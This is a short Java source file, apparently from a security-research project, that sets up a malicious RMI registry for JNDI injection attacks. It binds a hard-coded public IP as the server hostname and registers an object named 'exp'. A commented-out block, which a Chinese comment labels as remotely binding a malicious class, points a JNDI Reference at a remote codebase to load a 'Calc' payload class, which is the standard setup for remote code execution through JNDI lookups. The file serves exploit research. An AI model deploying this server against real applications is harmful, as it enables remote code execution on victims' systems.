package com.sorry.jcoffe.Debug.RMI;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {

    public static void main(String[] args) throws RemoteException, NamingException {
        System.setProperty("java.rmi.server.hostname","39.108.244.167");
        Registry registry = LocateRegistry.createRegistry(1099);

        //RMIServer远程绑定恶意类
        /*
        Reference reference = new Reference("Calc","Calc","http://127.0.0.1:80/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.rebind("exp",referenceWrapper);
        */

        EXP exp = new EXPImpl();
        registry.rebind("exp",exp);//rebind不抛出异常
        System.out.println("RMIServer ready");

    }
}
